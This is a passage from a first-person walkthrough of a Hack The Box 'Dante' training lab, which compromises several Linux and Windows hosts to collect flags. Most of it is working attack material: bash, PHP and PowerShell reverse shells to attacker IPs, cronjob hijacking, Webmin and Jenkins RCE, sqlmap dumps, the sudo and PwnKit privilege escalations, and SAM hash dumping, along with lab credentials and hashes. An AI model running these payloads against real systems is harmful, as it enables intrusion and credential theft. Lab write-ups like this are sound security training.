http://nix02.htb/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

Retrieved credentials of user margaret.

```
margaret:Welcome1!2@3#
```

I connected to the target server via SSH as user "margaret".

```
ssh margaret@nix02.htb
```

We are in a restricted shell environment, but I was able to breakout of it using "vim".

1. I launched vim

```
vim
```

2. Execute an escape sequence

Pressed Enter

```
:set shell=/bin/bash
```

3. Spawned the shell

Pressed Enter

```
:shell
```

Retrieved flag.txt in /home/margaret

```
DANTE{LF1_M@K3s_u5_lol}
```

Enumerating services, I see that there is an internal database running but oddly enough potentially another? It seems to be running on port 33060.

Since access is denied internally, let's try & perform port forwarding using SSH.

```
ssh -L 33060:127.0.0.1:33060 margaret@172.16.1.10
```

Unfortunately I wasn't able to connect. I found an interesting "apache_restart.py" file inside /home/frank directory. 

I decided to utilize an process spy tool called pspy32, since there were no cronjobs in /etc/crontab and I identified that the apache_restart.py is getting executed as cronjob with root permissions in frank's home directory. If we get to user frank, we can get root by creating an malicious python script.

I checked for processes which are getting ran by user "frank" and a lot of the processed are "Slack". Maybe if we can find an configuration file for user "frank" we can get the password?

```
ps -u frank
```

After an insanely long time I found out user frank's password in /home/margaret/.config/Slack/exported_data/secure/2020-05-18.json

```
frank:TractorHeadtorchDeskmat
```

Logged in as user "frank".

```
su frank
```

Since the previouisly discovered apache_restart.py is getting executed with root permissions by a cronjob and it's in frank's home directory we can just replace it.

1. Changed the name of the script

```
mv apache_restart.py apache_restart-backup.py
```

2. Created malicious python script

```
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.54/4444 0>&1'")
```

3. Started up listener on port 4444

```
nc -lvnp 4444
```

4. Gave script executable permissions

```
chmod +x apache_restart.py
```

After some time I gained root shell.

```
nc -lvnp 4444       
listening on [any] 4444 ...
connect to [10.10.16.54] from (UNKNOWN) [10.10.110.3] 6365
bash: cannot set terminal process group (175486): Inappropriate ioctl for device
bash: no job control in this shell
root@DANTE-NIX02:~#
```

Retrieved flag.txt in /root directory.

```
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
```

Post Exploitation didn't reveal any new credentials or escalation paths. So I moved onto the next server.

---
# DANTE-NIX03

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.17
Host is up (0.052s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
|_http-title: Index of /
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
|_http-server-header: MiniServ/1.900
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: 127.0.0.1

Host script results:
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-25T17:33:43
|_  start_date: N/A
```

Started off with enumerating SMB by using enum4linux.

```
enum4linux -a 172.16.1.17
```

Identified an user named "lou".

There seems to be 2 webservices running. Let's enumerate the one on port 80 first.

It seems to be running webmin, in the web-root there is a webmin folder & an webmin.zip file which provides us with the version information of 1.900. 

Searched up for public exploits.

```
searchsploit webmin 1.900
```

Apparently we can get RCE using Metasploit, let's do so!

```
msfconsole -q
```

Queried for exploits:

```
search name:webmin 1.900 type:exploit
```

Mapped the target ip address to the domain nix03.htb in our local dns file.

```
echo "172.16.1.17 nix03.htb" | tee -a /etc/hosts
```

Enumerated subdomains using ffuf, but couldn't find anything relevant.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://172.16.1.17 -H "Host: FUZZ.nix03.htb" -fs 900-1050
```

I tried utilizing CVE-2019-15642 & CVE-2019-15107 with public exploits from GitHub but I couldn't abuse them. The first CVE needs Authentication. Let's move on with enumerating SMB!

Utilized the tool "nxc" for this.

```
nxc smb nix03.htb -u '' -p '' --shares
```

We discovered an interesting share called "forensics" in which we have read & write permissions!

Connected to the SMB Share anonymosly.

```
smbclient \\\\nix03.htb/forensics
```

Downloaded an monitor binary onto my local machine and viewed it with strings.

```
strings monitor
```

The first line revealed webmin credentials!

```
admin:Password6543
```

I verified if they are working by logging into the login panel running at port 10000 and we got in! Let's utilize this exploit to get command execution!

```
git clone https://github.com/jas502n/CVE-2019-15642.git
```

Started up an netcat listener on port 8000 on my local machine.

```
nc -lvnp 8000
```

Executed the following exploit with an bash reverse shell 1 liner.

```
python2 CVE-2019-15642.py http://172.16.1.17:10000 "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.54/8000 0>&1'"
```

Gained RCE as user "root".

```
nc -lvnp 8000                   
listening on [any] 8000 ...
connect to [10.10.16.54] from (UNKNOWN) [10.10.110.3] 5002
bash: cannot set terminal process group (1282): Inappropriate ioctl for device
bash: no job control in this shell
root@DANTE-NIX03:/var/www/html/webmin/#
```

Retrieved flag.txt in /root directory.

```
DANTE{SH4RKS_4R3_3V3RYWHERE}
```

Couldn't find any interesting post exploitation so I moved on to the next target.

---
# DANTE-NIX04

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.12
Host is up (0.027s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
3306/tcp open  mysql    MariaDB 10.3.24 or later (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.99%I=7%D=7/25%Time=6A64F0F2%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.1
SF:6\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Upon viewing the webpage we are getting redirected to an default xampp page.
I decided to enumerate endpoints and found an interesting /blog endpoint which revealed an blog site which included an admin panel, registration functionality and revealed information about two usernames "admin" & "etemesi"

```
gobuster dir -u http://172.16.1.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Navigated to the admin panel and logged in with default credentials.

```
admin:admin
```

The CMS reveals information about the application called "Blog Admin 2020"

Didn't find any public exploits & tried to exploit any weaknesses in the CMS, but it doesn't allow me to.

I found the phpinfo.php file:

```
http://172.16.1.12/dashboard/phpinfo.php
```

It revealed the hostname of the target server 

```
DANTE-NIX04 
```

Since I got a nudge from someone, there might be an SQLi Vuln active in the /blog endpoint somewhere. Let's test it out using BurpSuite & sqlmap.

After trying many things I decided to focus on the title of the webpage "Responsive Blog" and searched for public exploits and found an SQLi in the id= parameter in Categories!

https://www.exploit-db.com/exploits/48615

```
http://172.16.1.12/blog/category.php?id='
```

Enumerated databases with sqlmap.

```
sqlmap -u http://172.16.1.12/blog/category.php?id=1 --dbs --batch
```

```
available databases [7]:                                                                                             
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

Let's first enumerate the flag database.

```
sqlmap -u http://172.16.1.12/blog/category.php?id=1 --batch -D flag --dump
```

```
DANTE{wHy_y0U_n0_s3cURe?!?!}
```

Enumerated Databases

```
sqlmap -r sql.req --batch -D db_admins --tables
```

Enumerated membership_users table and retrieved interesting credentials for potential user on the target server.

```
sqlmap -u http://172.16.1.12/blog/category.php?id=1 --batch -D blog_admin_db -T membership_users --dump
```

Seems to be an hash encoded password

```
ben:442179ad1de9c25593cabf625c0badb7
```

Cracked the hash using crackstation.net

```
ben:Welcometomyblog
```

Connected to the target server using SSH.

```
ssh ben@172.16.1.12
```

Retrieved flag.txt in /home/ben directory.

```
DANTE{Pretty_Horrific_PH4IL!}
```

Viewing user ben's sudo permissions is rather interesting, because he can execute the bash binary to all users besides root. It means we can connect to every user automatically!

```
sudo -l
(ALL, !root) /bin/bash
```

Enumerated users and found out there is another user called "julian".

Identified sudo version is below 1.8.28! Which means we can perform an one-liner to get root.

```
sudo -u#-1 /bin/bash
```

Gained Root Shell.

Retrieved flag.txt in /root directory.

```
DANTE{sudo_M4k3_me_@_Sandwich}
```

Performed Post Exploitation

Stored /etc/passwd & /etc/shadow on my local machine.

Execute the following command.

```
unshadow passwd shadow > unshadow
```

Now we can utilize john the ripper to bruteforce an password out of all the user hashes.

```
john unshadow --wordlist=/usr/share/wordlists/rockyou.txt
```

This didn't provide any results. Let's format all the hashes in the following format, so we can bruteforce with hashcat:

username:hash

```
$1$CrackMe$U93HdchOpEUP9iUxGVIvq/
```

Bruteforced it using hashcat and retrieved 1 password for user "julian".

```
hashcat -m 500 --username unshadow /usr/share/wordlists/rockyou.txt
```

Added those credentials into our wordlists.

```
julian:manchesterunited
```

---
## DANTE-NIX07

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.19
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
8080/tcp  open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: Host: 127.0.0.1
```

Proceeded with enumerating endpoints on port 80 with gobuster.

```
gobuster dir -u http://172.16.1.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

While the scan was running I decided to check out port 8080, since port 80 is completly blank. Port 8080 seems to be an Jenkins instance with an login panel required. The issue is the password of jenkin's always get's auto generated at the beginning, which means there is no real default credentials!

Enumerated Endpoints on port 8080 with gobuster and identified an interesting /oops endpoint, which acts like an 404, but it revealed information about Jenkins 2.240 being active. 

I wasn't able to find any useful publci exploits or CVE's which worked for us.

Mapped target ip address to temporary domain so we can bruteforce subdomains.

```
echo "172.16.1.19 temp.htb" | tee -a /etc/hosts
```

Enumerated subdomains. But no results.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://172.16.1.19 -H "Host: FUZZ.temp.htb" -fs 540-600
```

This seems to be an server which I can potentially target later on!


After comprimising every machine I came to this one.

We retrieved credentials for jenkins from another server.

```
Admin_129834765:SamsungOctober102030
```

Let's utilize them to login into the Jenkins Endpoint.

Logged into the Jenkins Endpoint at http://172.16.1.19:8080

There seems to be an build running named "FLAG_HERE" Upon inspecting it, it gave me an flag.

```
DANTE{to_g0_4ward_y0u_mus7_g0_back}
```

Let's abuse Jenkins Builds in order to get command execution / reverse shell.

1. Press on New Item > Give it Name > Scroll Down and select Shell

2. Put reverse shell inside

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.70/9000 0>&1'
```

3. Started up listener on port 9000

```
nc -lvnp 9000
```

4. Saved it and started build --> Gained RCE

```
rlwrap nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.110.3] 55608
bash: cannot set terminal process group (1315): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@DANTE-NIX07:~/workspace/pwned$
```
## Privilege Escalation

Enumerated internally running services.

```
netstat -tulnp
```

There seems to be an MySQL Database being active.

Connecting to it failed.

I tried my whole methodology, but couldn't find anything. Let's transfer linpeas to the target server.

```
wget http://10.10.14.70/linpeas.sh linpeas.sh
```

Gave it executable permissions.

```
chmod +x linpeas.sh
```

Ran it & enumerated the target server.

The target is vulnerable against PwnKit.

Downloaded the binary onto my local machine

```
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit PwnKit
```

Started up python3 webserver in which the binary is stored.

```
python3 -m http.server 80
```

Transfered the file onto the target server.

```
wget http://10.10.14.70/PwnKit PwnKit
```

Gave it executable permissions.

```
chmod +x PwnKit
```

Executed it and gained shell as user "root".

```
./PwnKit
./PwnKit
whoami
root
```

Retrieved flag.txt in /root directory.

```
DANTE{g0tta_<3_ins3cur3_GROupz!}
```

---
# DANTE-WS01

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.13
Host is up (0.027s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
443/tcp open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
445/tcp open  microsoft-ds?

Host script results:
| smb2-time: 
|   date: 2026-07-25T17:25:32
|_  start_date: N/A
|_clock-skew: 1s
|_nbstat: NetBIOS name: DANTE-WS01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:12:91:3d (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

The scan reveals information about an active xampp webservice and SMB being open. I was able to check out phpinfo.php which revealed a lot of information about the server infrastructure including an user called "gerald".

Before proceeding to enumerate port 80 & 443 I wanted to check if we can enumerate shares anonymously or with guest access I'll do it with nxc.

```
nxc smb 172.16.1.13 -u '' -p '' --shares
```

But it wasn't possible. Also trying to auth with gerald:gerald or gerald: wasn't possible.

Checked all of them with local auth aswell, but couldn't authenticate.

```
nxc smb 172.16.1.13 -u 'gerald' -p 'gerald' --local-auth
```

Let's move on with enumerating the webservices.

Started off with enumerating the webservice running on port 80 and found an interesting /discuss endpoint which seems to be an forum for dante it seems to offer login functionality aswell. Jackpot!

```
gobuster dir -u http://172.16.1.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It offers registering functionality too and checking the contact.php reveals an user named James.. there is also an message about Slack Migration.. could this be our user we already pwned previously? Let's check if his credentials work James:Toyota. Doesn't work unfortunately.

The registration form let's me upload an file. I uploaded an wolfswebshell.php and submitted my registration request. It went through! So I need to find out now where the file got stored. We could potentially find it out if we intercept the network package and inspect the path there. Let's utilize BurpSuite for this indevaour!

I wasn't able to find where my webshell was uploaded since it's not specified. But I decided to enumerate further endpoints on the discovered /discuss endpoint and found insanely interesting endpoints!!

```
gobuster dir -u http://172.16.1.13/discuss -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I was able to discover an /db endpoint. Which offered me an .sql database file! Also an /admin endpoint which literally gave me admin panel access lol & an /ups endpoint in which there was another .db file but also my webshell! We got command execution now as user "dante-ws01\gerald"! Let's go.

Oddly enough it wasn't possible to transfer files onto the target system. My webshell crashed afterwards.

Let's try & immediatly upload an reverse shell.

Created payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

The .exe payload didn't work. Let's try & use this php payload:

Started up netcat listener on local machine.

```
rlwrap nc -lvnp 443
```

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.138';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




```

Unfortunately I can't upload no more files anymore for some reason.

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.138',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

This worked, but I couldn't execute it. I'm assuming my php reverse shell script got denied, because it's too big. Let's find a smaller one, upload it and executed via browser.

I was so stupid. I could just upload the nc.exe file via wolfswebshell.php's upload functionality and did so. After I executed the following command:

```
nc.exe 10.10.14.138 443 -e cmd.exe
```

Gained RCE as user "gerald".

Retrieved flag.txt in C:\Users\gerald\Desktop.

```
DANTE{l355_t4lk_m04r_l15tening}
```
## Privilege Escalation


Enumerated privileges and groups of user "gerald"
He seems to be an local account also part of the Administrators group!

```
whoami /all
```

Oddly enough I'm unable to check the Administrator Share, even though I'm part of the Administrators.

Enumerated running services on the target server and found out about an internally running MySQL Database.

```
netstat -ano
```

Enumerated installed Applications and found "Druva inSync 6.6.3".

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Searched up public exploits and found an Local Priv Esc CVE-2020-5752

```
git clone https://github.com/x0rbeexd/CVE-2020-5752.git
```

1. Modified the script to add my machine ip and listener port

2. Started up netcat listener on local machine.

```
rlwrap nc -lvnp 443
```

3. Compiled to .exe file.

```
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

4. Transfered payload onto target server.

```
iwr -uri http://10.10.14.138:8080/exploit.exe -o exploit.exe
```

5. Transfered nc.exe onto target server.

```
iwr -uri http://10.10.14.138/nc.exe -o nc.exe
```

6. Executed payload.

```
./exploit.exe 10.10.14.138 443 C:\Temp\nc.exe
```

Gained RCE as SYSTEM User.

```
rlwrap nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.138] from (UNKNOWN) [10.10.110.3] 57678
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
DANTE{Bad_pr4ct1ces_Thru_strncmp}
```

For Post exploitation I utilized mimikatz.exe and transfered it onto the target server.

```
iwr -uri http://10.10.14.138/mimikatz.exe -o mimikatz.exe
```

Oddly enough we couldn't execute mimikatz (x86 & x64). Let's move on by transfering WinPEAS.

```
iwr -uri http://10.10.14.138/winPEASx64.exe -o winPEAS.exe
```

Since we have SYSTEM Shell let's extract the SAM & SYSTEM File out of the registry and download them onto our local machine to dump all Hashes.

On local machine:

```
impacket-smbserver test . -smb2support  -username saitama -password saitama
```

On target machine:

```
net use m: \\10.10.14.138\test /user:saitama saitama
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```

Utilize secretsdump to dump hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

Retrieved user hashes:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d0629f5539666892bf9ba4b34daa434c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fb203585283c2d3971202cd3fec9e126:::
gerald:1001:aad3b435b51404eeaad3b435b51404ee:a89f899fb9bcb2631435f54b7d9282f5:::
```

I couldn't get more flags, pivot into another internal network or find more credentials in post exploitation so I decided to move onto the next machine.

---
## DANTE-WS02

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.101
Host is up (0.027s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:60:9d:50 (unknown)
| smb2-time: 
|   date: 2026-07-25T17:33:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Started off with checking if anonymous & guest auth is enabled. But both doesn't work.

Tried accessing FTP anonymously, but didn't work & tried accessing rpcclient anonymously, but didn't work!

Let's create an wordlist for all users, passwords & hashes we were able to discover so far and potentially spray it against this target.

Sprayed using nxc with all retrieved users,passwords & hashes, but couldn't authenticate. Let's move on to the next target for now.

I now gathered a lot information and gained a lot of credentials, since I comprimised a lot of endpoints & an Domain Controller. 

Bruteforced the FTP Service and was able to authenticate as user "dharding".

```
nxc ftp 172.16.1.101 -u users.txt -p passwords.txt
```

```
dharding:WestminsterOrange5
```

Logged into the FTP Share & found an interesting .txt file.

```
ftp 172.16.1.101 21
```

```
Dido,
I've had to change your account password due to some security issues we have recently become aware of

It's similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James
```

Which means our current password but with a different number, let's create an wordlist out of 1-20 passwords and bruteforce it.

```
WestminsterOrange0
WestminsterOrange1
WestminsterOrange2
WestminsterOrange3
WestminsterOrange4
WestminsterOrange6
WestminsterOrange7
WestminsterOrange8
WestminsterOrange9
WestminsterOrange10
WestminsterOrange11
WestminsterOrange12
WestminsterOrange13
WestminsterOrange14
WestminsterOrange15
WestminsterOrange16
WestminsterOrange17
WestminsterOrange18
WestminsterOrange19
WestminsterOrange20
```

```
nxc smb 172.16.1.101 -u dharding -p passwords.txt
```

Retrieved Credentials for user "dharding".

```
dharding:WestminsterOrange17
```

Connected to the target machine.

```
evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```

Retrieved flag.txt in C:\Users\dharding\Desktop.

```
DANTE{superB4d_p4ssw0rd_FTW}
```

Enumerated Applications & found an interesting Application: IObit Uninstaller 9

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Googled for public exploits for this application.

```
https://www.exploit-db.com/exploits/48543
```

The exploit tells us about an Unquoted Service Path Priv Esc.

Let's check if the service is up & running with the in-built functionality of evil-winrm.

```
services
```

It's true! IObitUnSvr

Let's check if it runs as SYSTEM Process, so we can use it to elevate our privs.

```
sc.exe qc IObitUnSvr
```

Yes it does!

Let's proceed with transfering nc.exe onto the target system.

```
iwr -uri http://10.10.16.29/nc.exe -o nc.exe
```

Started up listener on local machine.

```
rlwrap nc -lvnp 88
